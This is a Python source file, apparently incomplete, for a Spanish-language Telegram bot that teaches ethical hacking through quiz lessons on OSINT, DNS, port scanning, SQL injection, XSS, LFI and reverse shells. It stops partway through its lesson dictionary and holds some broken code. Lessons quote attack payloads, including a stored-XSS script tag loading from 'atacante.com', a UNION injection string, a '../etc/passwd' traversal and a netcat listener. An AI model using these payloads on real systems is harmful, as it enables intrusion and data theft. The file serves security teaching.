#!/usr/bin/env python
# -*- coding: utf-8 -*-

"""
CyberHub Academy Bot v36.0
======================================================
Versión final con un sistema de verificación de respuestas flexible y conceptual.
Incluye el currículum masivo de 90 lecciones y todas las herramientas y funciones
administrativas en un único archivo estable y completo.
by: Alvaro
"""

# --- Dependencias (Asegúrate de instalarlas) ---
# pip install python-telegram-bot==21.0.1 requests==2.32.3 dnspython==2.6.1

import json
import os
import logging
import hashlib
import urllib.parse
import requests
import re
import random
import math
import base64
import dns.resolver
import socket
from functools import wraps
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode, ChatAction
import asyncio
from dotenv import load_dotenv

# --- Logging ---
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO,
    handlers=[logging.FileHandler("cyber_academy_intelligent.log"), logging.StreamHandler()]
)
logger = logging.getLogger(__name__)

load_dotenv('configs.env')

# --- Configuración ---
TOKEN = os.getenv("TELEGRAM_TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID"))
ADMIN_USERNAME = os.getenv("@alvarito_y")
DB_FILE = 'cyberhub_data_intelligent.json'

# --- Constantes ---
PRACTICES_PER_PAGE = 5
LEADERBOARD_SIZE = 10
POINTS_PER_PRACTICE = 10
POINTS_PER_CTF = 50
MAINTENANCE_MESSAGE = "🛠️ El bot está en mantenimiento. Inténtalo más tarde."
COMMON_PORTS = [21, 22, 23, 25, 53, 80, 110, 143, 443, 445, 3306, 3389, 5900, 8080, 8443]

# --- Estados ---
(AWAITING_PRACTICE_ANSWER, RECEIVE_USER_ID, RECEIVE_BROADCAST_MESSAGE, AWAITING_FEEDBACK,
 ADD_LESSON_LEVEL, ADD_LESSON_ID, ADD_LESSON_TITLE, ADD_LESSON_THEORY, ADD_LESSON_PRACTICE, ADD_LESSON_ANSWER,
 SET_CTF_PRACTICE, SET_CTF_ANSWER
) = range(12)

# --- Frases ---
MOTIVATIONAL_QUOTES = [
    "El conocimiento es poder. Sigue aprendiendo, sigue hackeando.", "Piensa como un adversario. Vive como un defensor.",
    "Cada línea de código que lees es una nueva puerta que abres.", "La curiosidad no mató al gato, lo convirtió en un pentester.",
]

# --- Planes VIP con Precios ---
VIP_PLANS = {
    "semanal": {"price": 7, "days": 7, "name": "Semanal"},
    "mensual": {"price": 15, "days": 30, "name": "Mensual"},
    "trimestral": {"price": 30, "days": 90, "name": "Trimestral"},
    "vitalicio": {"price": 70, "days": 9999, "name": "Vitalicio"}
}

# --- Curso Base ---
def generate_lessons(prefix, count):
    return [f"{prefix}{i}" for i in range(1, count + 1)]

BASE_COURSE_STRUCTURE = {
    "basico": {"name": "Nivel Básico", "emoji": "🔰", "lessons": generate_lessons('b', 30)},
    "medio": {"name": "Nivel Medio", "emoji": "🐍", "lessons": generate_lessons('m', 30)},
    "pro": {"name": "Nivel Pro", "emoji": "💥", "lessons": generate_lessons('p', 30)}
}

# --- Contenido de Lecciones (90 Lecciones COMPLETAS INTEGRADAS) ---
def create_full_content_hub():
    content = {}
    # Genera placeholders para asegurar que todos los IDs existan
    for prefix in ['b', 'm', 'p']:
        for i in range(1, 31):
            content[f'{prefix}{i}'] = {
                "title": f"Lección {prefix.upper()}{i}: Placeholder",
                "theory": "Contenido pendiente.",
                "practice": "Práctica pendiente.",
                "answer": ["placeholder"]
            }

# --- Contenido de Lecciones ---
BASE_CONTENT_HUB = {
  "b1": { "title": "B1: OSINT - Recolección Pasiva", "theory": "El <b>Open Source Intelligence (OSINT)</b> es la primera y más crucial fase de cualquier operación de ciberseguridad. Consiste en recolectar información sobre un objetivo utilizando únicamente fuentes de acceso público. Esto significa que no interactuamos directamente con la infraestructura del objetivo, lo que hace que esta fase sea completamente sigilosa.\n\nUna de las técnicas más básicas es el análisis de dominios. Cada dominio en internet tiene un registro público llamado <b>WHOIS</b>, que puede revelar quién es el propietario del dominio, su información de contacto, las fechas de registro y expiración, y, lo más importante, los <b>servidores de nombres (NS)</b>.", "practice": "<b>Práctica:</b> El dominio de la NASA es `nasa.gov`. Usa la herramienta <code>/whois nasa.gov</code>. Responde con el nombre del <b>Registrar</b>.", "answer": ["general services administration", "gsa"] },
  "b2": { "title": "B2: Enumeración de Subdominios", "theory": "Tras conocer un dominio, buscamos sus <b>subdominios</b> (ej: `mail.tesla.com`). Cada subdominio es un nuevo posible punto de entrada. Una técnica efectiva es consultar bases de datos de <b>Transparencia de Certificados (Certificate Transparency)</b>, que registran públicamente cada certificado SSL/TLS emitido. El comando <code>/subdomains</code> utiliza esta técnica.", "practice": "<b>Práctica:</b> El dominio de Harvard es `harvard.edu`. Usa <code>/subdomains harvard.edu</code>. Entre los resultados, encontrarás el subdominio de su escuela de negocios. Responde con el nombre completo de ese subdominio.", "answer": ["hbr.org"] },
  "b3": { "title": "B3: DNS - El Mapa de Internet", "theory": "El <b>DNS</b> traduce nombres de dominio a direcciones IP. Para un pentester, es un mapa. Registros clave: <b>A</b> (dominio a IPv4), <b>MX</b> (servidores de correo), y <b>TXT</b> (texto arbitrario, a menudo para registros de seguridad como SPF).", "practice": "<b>Práctica:</b> Usa <code>/dns mx gmail.com</code>. Uno de los servidores tiene la prioridad más alta (número más bajo). Responde con el nombre de ese servidor.", "answer": ["gmail-smtp-in.l.google.com"] },
  "b4": { "title": "B4: Escaneo de Puertos", "theory": "Si las IPs son edificios, los <b>puertos</b> son sus puertas. Un <b>escaneo de puertos</b> es un reconocimiento <b>activo</b> que consiste en 'llamar' a estas puertas para ver cuáles están abiertas. Un puerto abierto indica un servicio escuchando (ej: 22 para SSH, 80 para web), y cada servicio es un potencial punto de entrada.", "practice": "<b>Práctica:</b> `scanme.nmap.org` es un sitio para practicar. Usa <code>/portscan scanme.nmap.org</code>. Responde con el nombre del servicio que corre en el <b>puerto 22</b>.", "answer": ["ssh"] },
  "b5": { "title": "B5: Hashing", "theory": "El <b>hashing</b> es la huella digital de los datos. Propiedades: determinista, eficiente, resistente a preimágenes (one-way) y a colisiones. Se usa para verificar la integridad de archivos y almacenar contraseñas. Algoritmos comunes: <b>MD5</b> (inseguro para claves), <b>SHA-1</b> (debilitado) y <b>SHA-256</b> (estándar).", "practice": "<b>Práctica:</b> Si el hash de un archivo descargado no coincide con el publicado en la web, ¿qué pilar de la tríada CIA ha sido violado?", "answer": ["integridad"] },
  "b6": { "title": "B6: Codificación Base64", "theory": "La <b>codificación</b> no es <b>cifrado</b>. El cifrado oculta información, la codificación la transforma a un formato estándar. <b>Base64</b> representa datos binarios en texto ASCII. Si ves una cadena larga que termina con <code>=</code> o <code>==</code>, probablemente sea Base64.", "practice": "<b>Práctica:</b> Un comentario en una web dice: `Clave API: Q3liZXJIdWJBY2FkZW15`. Usa <code>/base64 dec [texto]</code>. Responde con el texto decodificado.", "answer": ["cyberhubacademy"] },
  "b7": { "title": "B7: Google Dorking", "theory": "<b>Google Dorking</b> usa operadores de búsqueda (<code>site:</code>, <code>filetype:</code>, <code>inurl:</code>) para OSINT avanzado, permitiendo encontrar archivos sensibles y vulnerabilidades.", "practice": "<b>Práctica:</b> Quieres encontrar backups de configuraciones de WordPress, que suelen llamarse `wp-config.php.bak`. Responde con el Google Dork que usarías para encontrar este tipo de archivos.", "answer": [["filetype:bak", "inurl:wp-config.php"]] },
  "b8": { "title": "B8: Cabeceras HTTP", "theory": "Cada comunicación web envía <b>cabeceras HTTP</b>. La cabecera <b>`Server`</b> a menudo anuncia el software y versión del servidor (ej: `Server: Apache/2.4.52`), permitiendo a un atacante buscar vulnerabilidades para esa versión.", "practice": "<b>Práctica:</b> Usa <code>/httpheaders github.com</code>. ¿Qué valor revela la cabecera `Server`?", "answer": ["github.com"] },
  "b9": { "title": "B9: ¿Qué es un CVE?", "theory": "Una <b>vulnerabilidad</b> es una debilidad. Para estandarizarlas, se creó el sistema <b>Common Vulnerabilities and Exposures (CVE)</b>. Cada una recibe un ID (<code>CVE-AÑO-NÚMERO</code>) y una puntuación de severidad <b>CVSS</b> de 0 a 10.", "practice": "<b>Práctica:</b> 'Heartbleed' es `CVE-2014-0160`. Usa <code>/cve CVE-2014-0160</code>. Responde con la puntuación <b>CVSS</b>.", "answer": ["7.5"] },
  "b10": { "title": "B10: Ingeniería Social", "theory": "La <b>Ingeniería Social</b> es el arte de 'hackear humanos' explotando la psicología: confianza, miedo, curiosidad. Técnicas incluyen <b>Phishing</b> (correos), <b>Pretexting</b> (escenarios), <b>Baiting</b> (cebos como USBs).", "practice": "<b>Práctica:</b> Un atacante llama diciendo: 'Hola, soy de soporte técnico. Detectamos un virus y necesitamos control remoto'. ¿Qué técnica está utilizando?", "answer": ["pretexting", "pretexto"] },
  "b11": { "title": "B11: La Línea de Comandos (CLI)", "theory": "La <b>Command-Line Interface (CLI)</b> es una herramienta esencial. Permite ejecutar comandos directamente y automatizar tareas de forma mucho más potente que con una interfaz gráfica.", "practice": "<b>Práctica:</b> En una terminal Linux, ¿qué comando usarías para ver tu dirección IP actual?", "answer": ["ifconfig", "ip a"] },
  "b12": { "title": "B12: TCP vs UDP", "theory": "<b>TCP (Transmission Control Protocol)</b> y <b>UDP (User Datagram Protocol)</b> son dos protocolos de transporte. TCP es <b>orientado a conexión</b> y fiable: garantiza que todos los paquetes lleguen en orden (ej: navegación web, email). UDP es <b>no orientado a conexión</b> y rápido: envía paquetes sin garantizar su llegada (ej: streaming de video, juegos online).", "practice": "<b>Práctica:</b> Si estás haciendo una videollamada y la imagen se pixela por un momento pero la llamada no se corta, ¿qué protocolo de transporte es más probable que se esté usando?", "answer": ["udp"] },
  "b13": { "title": "B13: ¿Qué es una Dirección MAC?", "theory": "La <b>Dirección MAC (Media Access Control)</b> es un identificador único de 48 bits asignado a la tarjeta de red de un dispositivo. Opera en la Capa 2 (Enlace de Datos) del modelo OSI y se usa para la comunicación dentro de una red local (LAN). Mientras que la IP es como tu dirección postal (puede cambiar), la MAC es como tu número de serie.", "practice": "<b>Práctica:</b> ¿Qué técnica usan los atacantes para cambiar su dirección MAC y hacerse pasar por otro dispositivo en la red o evadir filtros?", "answer": ["spoofing"] },
  "b14": { "title": "B14: Virtualización", "theory": "La <b>Virtualización</b> permite ejecutar múltiples sistemas operativos (llamados 'invitados') sobre un único sistema físico ('anfitrión'). Software como <b>VirtualBox</b> o <b>VMware</b> crea Máquinas Virtuales (VMs), que son entornos aislados. Esto es crucial en ciberseguridad para crear laboratorios seguros donde probar malware o exploits sin dañar nuestro equipo real.", "practice": "<b>Práctica:</b> En un entorno de virtualización, ¿qué componente de software es responsable de gestionar y asignar los recursos del hardware físico (CPU, RAM) a las diferentes máquinas virtuales?", "answer": ["hipervisor", "hypervisor"] },
  "b15": { "title": "B15: Tipos de Malware", "theory": "<b>Malware</b> es cualquier software diseñado para dañar o explotar un sistema. Tipos comunes:\n- <b>Virus:</b> Se adjunta a un programa legítimo y necesita ejecución humana.\n- <b>Gusano (Worm):</b> Se autorreplica y propaga a través de la red sin intervención humana.\n- <b>Troyano (Trojan):</b> Se disfraza de software legítimo para engañar al usuario y darle acceso al atacante.\n- <b>Ransomware:</b> Cifra los archivos del usuario y exige un rescate para devolverlos.", "practice": "<b>Práctica:</b> Un malware se propaga automáticamente de un PC a otro en una red de oficina explotando una vulnerabilidad en Windows, sin que nadie abra ningún archivo. ¿Qué tipo de malware es este?", "answer": ["gusano", "worm"] },
  "b16": { "title": "B16: Seguridad de Contraseñas y 2FA", "theory": "Una contraseña fuerte es larga, compleja (mayúsculas, minúsculas, números, símbolos) y única para cada servicio. Sin embargo, incluso la mejor contraseña puede ser robada. La <b>Autenticación de Dos Factores (2FA)</b> añade una capa de seguridad extra. Requiere no solo 'algo que sabes' (la contraseña), sino también 'algo que tienes' (tu teléfono con una app de autenticación) o 'algo que eres' (tu huella dactilar).", "practice": "<b>Práctica:</b> Estás usando una app como Google Authenticator que genera un código de 6 dígitos que cambia cada 30 segundos. ¿Cómo se llama este tipo de contraseña de un solo uso basada en el tiempo?", "answer": ["totp"] },
  "b17": { "title": "B17: Cookies y Sesiones Web", "theory": "HTTP es un protocolo 'sin estado', lo que significa que cada petición es independiente. Para que un sitio web te 'recuerde' entre una página y otra, utiliza <b>sesiones</b>. Cuando te logueas, el servidor crea una sesión y te da un identificador único, que se almacena en tu navegador en un pequeño archivo de texto llamado <b>cookie</b>. En cada petición posterior, tu navegador envía la cookie de sesión para que el servidor sepa quién eres.", "practice": "<b>Práctica:</b> Si un atacante logra robar tu cookie de sesión de un sitio web, ¿qué tipo de ataque puede realizar para acceder a tu cuenta sin necesidad de saber tu contraseña?", "answer": [["session", "hijacking"], ["secuestro", "sesion"]] },
  "b18": { "title": "B18: El Framework MITRE ATT&CK", "theory": "El <b>MITRE ATT&CK</b> es una base de conocimiento globalmente accesible de tácticas y técnicas de adversarios basadas en observaciones del mundo real. A diferencia de los CVEs (que son vulnerabilidades específicas), ATT&CK se enfoca en el <b>comportamiento</b> del atacante. Organiza las acciones en una matriz de tácticas como 'Acceso Inicial', 'Ejecución', 'Persistencia', 'Escalada de Privilegios', etc. Es una herramienta invaluable para los equipos de defensa (Blue Teams) para entender y detectar amenazas.", "practice": "<b>Práctica:</b> Un atacante utiliza phishing para lograr que un empleado ejecute un archivo malicioso. Según la matriz de MITRE ATT&CK, ¿a qué táctica corresponde el phishing?", "answer": [["initial", "access"], ["acceso", "inicial"]] },
  "b19": { "title": "B19: Cifrado Simétrico vs Asimétrico", "theory": "El <b>Cifrado Simétrico</b> (ej: AES) utiliza la <b>misma clave</b> para cifrar y descifrar. Es muy rápido, pero tiene el problema de cómo compartir la clave de forma segura. El <b>Cifrado Asimétrico</b> (ej: RSA) utiliza un par de claves: una <b>clave pública</b> para cifrar y una <b>clave privada</b> para descifrar. La clave pública se puede compartir con cualquiera. Es más lento, pero resuelve el problema del intercambio de claves.", "practice": "<b>Práctica:</b> Cuando te conectas a un sitio web con HTTPS, tu navegador y el servidor utilizan un tipo de cifrado para negociar de forma segura una clave de sesión, que luego usarán con otro tipo de cifrado más rápido para la comunicación. ¿Qué tipo de cifrado se usa para el intercambio inicial de claves?", "answer": ["asimetrico"] },
  "b20": { "title": "B20: ¿Qué es una API?", "theory": "Una <b>API (Application Programming Interface)</b> es un conjunto de reglas y herramientas que permite que diferentes aplicaciones de software se comuniquen entre sí. En el mundo web, las <b>APIs REST</b> son las más comunes. Permiten a un cliente (como una app móvil) solicitar datos de un servidor usando los métodos HTTP estándar (GET, POST, PUT, DELETE). Las APIs son un objetivo principal para los atacantes, ya que a menudo procesan datos sensibles y pueden tener vulnerabilidades de seguridad propias.", "practice": "<b>Práctica:</b> Si una aplicación necesita obtener información de un usuario desde una API, ¿qué método HTTP es el estándar para solicitar/leer datos sin modificarlos?", "answer": ["get"] },
  "b21": { "title": "B21: Linux - Manipulación de Texto", "theory": "En ciberseguridad, pasamos mucho tiempo analizando logs y archivos de texto. Linux ofrece herramientas muy potentes para esto: <code>grep</code> para buscar patrones, <code>sed</code> para editar flujos de texto, y <code>awk</code> para procesar datos en columnas. Dominar <code>grep</code> es fundamental. Por ejemplo, <code>grep -i 'error' /var/log/syslog</code> buscaría la palabra 'error' (ignorando mayúsculas/minúsculas) en el log del sistema.", "practice": "<b>Práctica:</b> Tienes un archivo `access.log` y quieres encontrar todas las peticiones que se hicieron desde la dirección IP `192.168.1.100`. ¿Qué comando usarías?", "answer": ["grep 192.168.1.100 access.log"] },
  "b22": { "title": "B22: Linux - Permisos de Archivos", "theory": "Linux utiliza un sistema de permisos robusto. Cada archivo tiene permisos de <b>Lectura (r)</b>, <b>Escritura (w)</b> y <b>Ejecución (x)</b> para tres tipos de entidades: el <b>Usuario</b> propietario, el <b>Grupo</b> propietario y <b>Otros</b>. El comando <code>chmod</code> los modifica. Por ejemplo, <code>chmod 755 script.sh</code> le da todos los permisos (rwx) al usuario, y permisos de lectura y ejecución (r-x) al grupo y a otros.", "practice": "<b>Práctica:</b> Ves un archivo con los permisos <code>-rwxr-xr--</code>. ¿Tienen los 'Otros' (others) permiso para ejecutar este archivo?", "answer": ["no"] },
  "b23": { "title": "B23: ¿Qué es una VPN?", "theory": "Una <b>VPN (Virtual Private Network)</b> crea una conexión segura y cifrada a través de una red pública como Internet. Actúa como un túnel: todo tu tráfico pasa a través de los servidores de la VPN antes de llegar a su destino final. Esto oculta tu dirección IP real y cifra tus datos, protegiéndote de la vigilancia en redes Wi-Fi públicas y permitiéndote eludir la censura geográfica.", "practice": "<b>Práctica:</b> ¿Cuál es el principal objetivo de seguridad que se logra al cifrar el tráfico con una VPN?", "answer": ["confidencialidad"] },
  "b24": { "title": "B24: Cyber Kill Chain", "theory": "La <b>Cyber Kill Chain</b> es un modelo que describe las 7 fases de un ciberataque: 1. Reconocimiento, 2. Armamento, 3. Entrega, 4. Explotación, 5. Instalación, 6. Comando y Control (C2), 7. Acciones sobre objetivos.", "practice": "<b>Práctica:</b> Un atacante envía un correo de phishing con un PDF malicioso. ¿A qué fase de la Kill Chain corresponde el envío del correo?", "answer": ["entrega", "delivery"] },
  "b25": { "title": "B25: Red Botnet", "theory": "Una <b>botnet</b> es una red de ordenadores infectados ('zombies') controlados por un atacante ('botmaster') para realizar ataques a gran escala, como <b>DDoS</b>.", "practice": "<b>Práctica:</b> Si miles de ordenadores envían tráfico basura a un servidor hasta que colapsa, ¿qué tipo de ataque está llevando a cabo la botnet?", "answer": ["ddos"] },
  "b26": { "title": "B26: Seguridad Física", "theory": "La <b>seguridad física</b> es crucial. Si un atacante accede a una sala de servidores, puede robar discos o instalar hardware malicioso. Medidas como controles de acceso y cámaras son la primera línea de defensa.", "practice": "<b>Práctica:</b> Un atacante se disfraza de técnico y convence al recepcionista para que le deje entrar. ¿Qué técnica está usando?", "answer": ["ingenieria social"] },
  "b27": { "title": "B27: Hardening de Sistemas", "theory": "El <b>Hardening</b> es el proceso de asegurar un sistema reduciendo su superficie de ataque. Implica deshabilitar servicios innecesarios, aplicar parches y seguir el <b>principio de mínimo privilegio</b>.", "practice": "<b>Práctica:</b> Un administrador instala un servidor web con FTP y Telnet activos por defecto. Como parte del hardening, ¿qué debería hacer con estos servicios si no se usan?", "answer": ["deshabilitarlos", "desactivarlos"] },
  "b28": { "title": "B28: Inyección de Comandos (OS)", "theory": "La <b>Inyección de Comandos</b> ocurre cuando una aplicación pasa la entrada del usuario directamente a la shell del sistema operativo sin validarla. Esto permite ejecutar comandos arbitrarios en el servidor.", "practice": "<b>Práctica:</b> En un sistema Linux vulnerable, ¿qué carácter se usa para separar un comando legítimo y 'encadenar' uno malicioso?", "answer": [";"] },
  "b29": { "title": "B29: Cifrado en Reposo vs en Tránsito", "theory": "El <b>cifrado en tránsito</b> protege los datos mientras se mueven por una red (ej: HTTPS). El <b>cifrado en reposo</b> protege los datos cuando están almacenados (ej: BitLocker). Ambos son necesarios.", "practice": "<b>Práctica:</b> Cuando usas HTTPS para navegar, ¿qué tipo de cifrado se está aplicando?", "answer": ["en transito"] },
  "b30": { "title": "B30: Desafío Básico Final", "theory": "Este desafío combina varias técnicas. El OSINT a menudo implica conectar piezas de información de diferentes fuentes para formar una imagen completa del objetivo.", "practice": "<b>Práctica:</b> La empresa `megacorpone.com` tiene un servidor de correo. Usa <code>/dns mx megacorpone.com</code> para encontrar su nombre. Luego, usa <code>/portscan</code> en ese nombre. Responde con el número del puerto de correo seguro (IMAPS) que está abierto.", "answer": ["993"] },
  
  "m1": { "title": "M1: Nmap Avanzado - NSE", "theory": "Nmap no solo escanea puertos. Con el <b>Nmap Scripting Engine (NSE)</b>, puede detectar vulnerabilidades y enumerar servicios. <code>-sC</code> ejecuta scripts por defecto y <code>-sV</code> detecta versiones de servicios.", "practice": "<b>Práctica:</b> ¿Qué combinación de flags usarías en Nmap para un escaneo de versiones y ejecutar scripts por defecto?", "answer": ["-sv -sc", "-sc -sv"] },
  "m2": { "title": "M2: Análisis de Tráfico con Wireshark", "theory": "<b>Wireshark</b> es un analizador de protocolos de red que permite capturar e inspeccionar el tráfico en tiempo real. Esencial para analizar malware y entender aplicaciones. Puedes filtrar por protocolo (<code>http</code>), IP (<code>ip.addr == 8.8.8.8</code>) o puerto (<code>tcp.port == 443</code>).", "practice": "<b>Práctica:</b> En Wireshark, si quieres ver todas las peticiones DNS y sus respuestas, ¿qué filtro de visualización usarías?", "answer": ["dns"] },
  "m3": { "title": "M3: Explotación Web con Burp Suite", "theory": "<b>Burp Suite</b> es la navaja suiza para el pentesting de aplicaciones web. Su función principal es actuar como un <b>proxy de intercepción</b>, permitiéndote ver y modificar todo el tráfico HTTP/S entre tu navegador y el servidor. El módulo 'Repeater' te permite reenviar y modificar una petición individual repetidamente para probar diferentes payloads.", "practice": "<b>Práctica:</b> Quieres probar una vulnerabilidad de Inyección SQL en un parámetro de una URL. ¿Qué módulo de Burp Suite es el más adecuado para enviar la misma petición muchas veces con pequeñas modificaciones?", "answer": ["repeater"] },
  "m4": { "title": "M4: Inyección SQL - UNION-based", "theory": "La <b>Inyección SQL basada en UNION</b> es una técnica que aprovecha la sentencia <code>UNION SQL</code> para combinar el resultado de una consulta maliciosa con la consulta legítima de la aplicación. Para que funcione, la consulta maliciosa debe devolver el mismo número de columnas que la consulta original. Se usa <code>ORDER BY</code> para adivinar el número de columnas.", "practice": "<b>Práctica:</b> Un atacante inyecta <code>' UNION SELECT NULL, version(), NULL--</code>. ¿Qué información está intentando extraer de la base de datos?", "answer": ["version"] },
  "m5": { "title": "M5: Cross-Site Scripting (XSS) Almacenado", "theory": "A diferencia del XSS Reflejado, el <b>XSS Almacenado (Stored XSS)</b> es mucho más peligroso. Ocurre cuando un payload malicioso se guarda permanentemente en la base de datos del servidor (ej: en un comentario de un blog, un nombre de perfil). Cada vez que un usuario visita la página afectada, el script se ejecuta en su navegador. Esto permite al atacante robar las cookies de sesión de todos los visitantes.", "practice": "<b>Práctica:</b> Un atacante publica un comentario en un foro con el payload <code>&lt;script src='http://atacante.com/robo.js'&gt;&lt;/script&gt;</code>. ¿Qué tipo de ataque XSS está realizando?", "answer": ["almacenado", "stored"] },
  "m6": { "title": "M6: Password Cracking con John The Ripper", "theory": "<b>John The Ripper (JTR)</b> es una popular herramienta de cracking de contraseñas. Puede tomar hashes de contraseñas (extraídos de archivos como <code>/etc/shadow</code> en Linux) y intentar romperlos usando listas de palabras (diccionarios) o ataques de fuerza bruta. El primer paso es a menudo usar una herramienta como <code>unshadow</code> para combinar los archivos <code>passwd</code> y <code>shadow</code> en un formato que JTR pueda leer.", "practice": "<b>Práctica:</b> Si JTR logra romper un hash y revela que la contraseña es '123456', ¿qué tipo de ataque fue el más probablemente exitoso?", "answer": ["diccionario"] },
  "m7": { "title": "M7: Introducción a Metasploit", "theory": "El <b>Metasploit Framework</b> es una plataforma de pentesting que simplifica el proceso de explotación. Sus componentes clave son:\n- <b>Exploits:</b> Código que aprovecha una vulnerabilidad específica.\n- <b>Payloads:</b> Código que se ejecuta en el objetivo después de una explotación exitosa (ej: una shell).\n- <b>Modules:</b> Scripts auxiliares para escaneo, enumeración, etc.\n- <b>MSFConsole:</b> La interfaz de línea de comandos para interactuar con el framework.", "practice": "<b>Práctica:</b> Dentro de <code>msfconsole</code>, ¿qué comando usarías para buscar un exploit relacionado con la vulnerabilidad 'EternalBlue'?", "answer": ["search eternalblue"] },
  "m8": { "title": "M8: Escalada de Privilegios en Linux - SUID", "theory": "La <b>escalada de privilegios</b> es el objetivo después de obtener acceso inicial. En Linux, una técnica común es abusar de binarios con el bit <b>SUID (Set User ID)</b> activado. Un archivo con SUID se ejecuta con los permisos del propietario del archivo, no del usuario que lo lanza. Si un binario propiedad de 'root' tiene el bit SUID y una vulnerabilidad, un usuario normal podría explotarlo para ejecutar comandos como 'root'.", "practice": "<b>Práctica:</b> ¿Qué comando usarías en una terminal Linux para encontrar todos los archivos en el sistema con el permiso SUID activado?", "answer": [["find", "-perm", "-u=s"]] },
  "m9": { "title": "M9: Local File Inclusion (LFI)", "theory": "La <b>Inclusión Local de Archivos (LFI)</b> es una vulnerabilidad web que permite a un atacante incluir y ejecutar o mostrar archivos del servidor. Ocurre cuando una aplicación utiliza la entrada del usuario para construir la ruta a un archivo que será incluido. Por ejemplo, en PHP, <code>include($_GET['pagina']);</code> es vulnerable. Un atacante podría usar <code>?pagina=../../../../etc/passwd</code> para leer el archivo de usuarios del sistema.", "practice": "<b>Práctica:</b> ¿Qué secuencia de caracteres es fundamental en un payload de LFI para navegar hacia arriba en la estructura de directorios del servidor?", "answer": ["../"] },
  "m10": { "title": "M10: Anatomía de una Shell Inversa", "theory": "Una <b>shell inversa (reverse shell)</b> es un payload donde la máquina objetivo se conecta de vuelta a la máquina del atacante. Esto es extremadamente útil para eludir firewalls, ya que las conexiones salientes suelen estar menos restringidas que las entrantes. El atacante pone un 'listener' (oyente) en su máquina (ej: con <code>netcat -lvp 4444</code>) y el payload ejecutado en la víctima establece una conexión a la IP y puerto del atacante, dándole control de la terminal.", "practice": "<b>Práctica:</b> Si un atacante establece un listener en su máquina, ¿quién inicia la conexión en un escenario de shell inversa: el atacante o la víctima?", "answer": ["victima"] },
  "m11": { "title": "M11: Cross-Site Request Forgery (CSRF)", "theory": "<b>CSRF</b> es un ataque que obliga a un usuario autenticado a realizar acciones no deseadas en una aplicación web. Se previene usando tokens anti-CSRF únicos en cada sesión o petición.", "practice": "<b>Práctica:</b> Si un sitio usa tokens anti-CSRF, ¿dónde esperaría el servidor recibir ese token para validar una petición?", "answer": ["formulario", "cabeceras"] },
  "m12": { "title": "M12: XML External Entity (XXE)", "theory": "Los ataques <b>XXE</b> explotan parsers de XML mal configurados. Permiten a un atacante leer archivos locales, realizar peticiones internas (SSRF) o causar DoS.", "practice": "<b>Práctica:</b> ¿Qué entidad sensible intentaría leer un atacante en Linux para ver los usuarios del sistema mediante un ataque XXE?", "answer": ["/etc/passwd"] },
  "m13": { "title": "M13: Hacking de WiFi - WPA2", "theory": "Atacar redes <b>WPA/WPA2-Personal</b> implica capturar el 'handshake' de 4 vías que ocurre cuando un cliente se conecta al punto de acceso. Este handshake contiene información que puede ser crackeada offline con herramientas como Aircrack-ng y una lista de contraseñas.", "practice": "<b>Práctica:</b> En un ataque a una red WPA2, ¿qué es lo que se captura y se intenta crackear offline?", "answer": ["handshake"] },
  "m14": { "title": "M14: Evasión de Firewalls", "theory": "Los firewalls bloquean tráfico basándose en reglas. Las técnicas de evasión incluyen <b>Fragmentación de Paquetes</b> (dividir paquetes para que el firewall no vea el payload completo), <b>Spoofing de IP de Origen</b>, y <b>Tunneling</b> (encapsular un protocolo dentro de otro, como SSH sobre DNS o HTTP).", "practice": "<b>Práctica:</b> ¿Qué técnica de evasión de firewalls es particularmente efectiva porque el protocolo encapsulado suele estar permitido en todas las redes?", "answer": ["tunneling"] },
  "m15": { "title": "M15: Criptografía - Esteganografía", "theory": "La <b>Esteganografía</b> es el arte de ocultar información dentro de otros archivos (imágenes, audio, video). A diferencia de la criptografía, que oculta el contenido del mensaje, la esteganografía oculta la existencia misma del mensaje. Herramientas como Steghide pueden incrustar y extraer datos secretos de archivos.", "practice": "<b>Práctica:</b> ¿Cuál es el objetivo principal de la esteganografía?", "answer": ["ocultar la existencia del mensaje"] },
  "m16": { "title": "M16: Escalada de Privilegios en Windows - UAC Bypass", "theory": "El <b>User Account Control (UAC)</b> en Windows es una medida de seguridad que pide confirmación antes de realizar acciones que requieran privilegios de administrador. Sin embargo, existen numerosas técnicas de <b>UAC Bypass</b> que explotan la forma en que Windows maneja ciertos procesos de confianza para ejecutar código con privilegios elevados sin mostrar el aviso al usuario.", "practice": "<b>Práctica:</b> Si un exploit logra ejecutar un programa como administrador sin que aparezca la ventana de confirmación de UAC, ¿qué ha logrado?", "answer": [["uac", "bypass"]] },
  "m17": { "title": "M17: Pivoting y Movimiento Lateral", "theory": "Una vez que un atacante compromete una máquina en una red, rara vez es su objetivo final. El <b>Pivoting</b> es la técnica de usar la máquina comprometida como un 'pivote' para atacar otras máquinas dentro de la misma red que no son accesibles desde el exterior. Este proceso de moverse de una máquina a otra se conoce como <b>Movimiento Lateral</b>.", "practice": "<b>Práctica:</b> Un atacante compromete un servidor web en la DMZ. Luego, desde ese servidor, lanza un escaneo a la red interna de la empresa. ¿Qué técnica está utilizando?", "answer": ["pivoting"] },
  "m18": { "title": "M18: Exfiltración de Datos", "theory": "La <b>Exfiltración de Datos</b> es la fase final de muchos ataques, donde el objetivo es robar información sensible. Los atacantes deben hacerlo de forma sigilosa para no ser detectados. Técnicas comunes incluyen comprimir y cifrar los datos, y luego sacarlos de la red a través de canales que parecen legítimos, como peticiones DNS (DNS Tunneling) o tráfico HTTPS a un servidor controlado por el atacante.", "practice": "<b>Práctica:</b> Un atacante quiere exfiltrar un archivo de 1GB de una red corporativa. ¿Qué debería hacer primero con el archivo para reducir su tamaño y ocultar su contenido antes de enviarlo?", "answer": ["comprimir", "cifrar"] },
  "m19": { "title": "M19: Análisis de Malware - Estático", "theory": "El <b>Análisis Estático de Malware</b> consiste en examinar el archivo malicioso sin ejecutarlo. Se utilizan herramientas como <code>strings</code> para extraer texto legible (IPs, URLs, nombres de archivo), desensambladores como IDA Pro o Ghidra para ver el código ensamblador, y herramientas como PEview para inspeccionar la estructura del archivo ejecutable de Windows.", "practice": "<b>Práctica:</b> Si usas el comando <code>strings</code> en un archivo de malware y encuentras la URL <code>http://servidor-c2-malicioso.com/gate.php</code>, ¿qué has descubierto?", "answer": [["servidor", "comando", "control"], ["c2"]] },
